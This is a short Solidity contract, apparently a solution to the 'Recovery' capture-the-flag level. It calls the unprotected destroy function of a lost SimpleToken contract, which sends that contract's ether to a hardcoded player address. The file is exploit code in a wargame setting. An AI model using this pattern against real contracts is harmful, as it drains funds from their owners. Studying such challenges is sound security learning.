// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;
import './SimpleToken.sol';

contract RecoveryAttacker {
    SimpleToken public target;

    constructor(address payable _targetAddr) public {
        // Address of the first SimpleToken contract created by contract.address
        target = SimpleToken(_targetAddr);
    }

    function attack() public {
        // player addr
        target.destroy(payable(0x4545c437d127B29bF0BB080DeEe97f159AB827d8));
    }
}